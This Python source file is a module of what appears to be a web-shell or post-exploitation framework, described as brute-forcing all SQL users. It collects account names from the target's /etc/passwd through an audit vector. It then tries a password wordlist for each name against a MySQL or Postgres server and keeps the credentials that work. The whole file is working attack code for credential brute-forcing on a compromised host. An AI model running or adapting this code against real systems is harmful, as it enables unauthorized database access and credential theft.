from core.moduleprobe import ModuleProbe
from core.moduleexception import ProbeException, ProbeSucceed
from core.vector import VectorList, Vector
from core.savedargparse import SavedArgumentParser as ArgumentParser
from ast import literal_eval
from argparse import SUPPRESS
from os import sep
from string import ascii_lowercase
from random import choice
from re import compile
from sql import Sql

class Sqlusers(Sql):
    """ Bruteforce all SQL users"""
    
    argparser = ArgumentParser(usage=__doc__)
    argparser.add_argument('-hostname', help='DBMS host or host:port', default='127.0.0.1')
    argparser.add_argument('-wordfile', help='Local wordlist path')
    argparser.add_argument('-startline', help='Start line of local wordlist', type=int, default=0)
    argparser.add_argument('-chunksize', type=int, default=5000)
    argparser.add_argument('-wordlist', help='Try words written as "[\'word1\', \'word2\']"', type=literal_eval, default=[])
    argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')

    def _prepare_probe(self):
        
        self.args['username_list'] = Vector('audit.etcpasswd', 'users', "-real" ).execute(self.modhandler).keys()
        Sql._prepare_probe(self)
              
    def _probe(self):
        
        result = {}
        
        for user in self.args['username_list']:
            self.args['username'] = user
            try:
                Sql._probe(self)
            except ProbeSucceed:
                result[user] = self._result[1]
                self._result = []
        
        self._result = result
          